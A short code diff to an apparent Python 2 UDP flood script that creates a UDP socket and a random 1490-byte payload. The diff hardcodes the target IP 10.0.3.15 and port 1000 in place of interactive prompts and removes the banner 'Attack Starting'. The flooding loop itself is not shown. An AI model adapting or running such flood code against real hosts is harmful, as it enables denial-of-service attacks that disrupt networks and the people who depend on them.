@@ -17,14 +17,11 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
 print
 print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = "10.0.3.15"
+port = 1000
 
-os.system("clear")
-os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
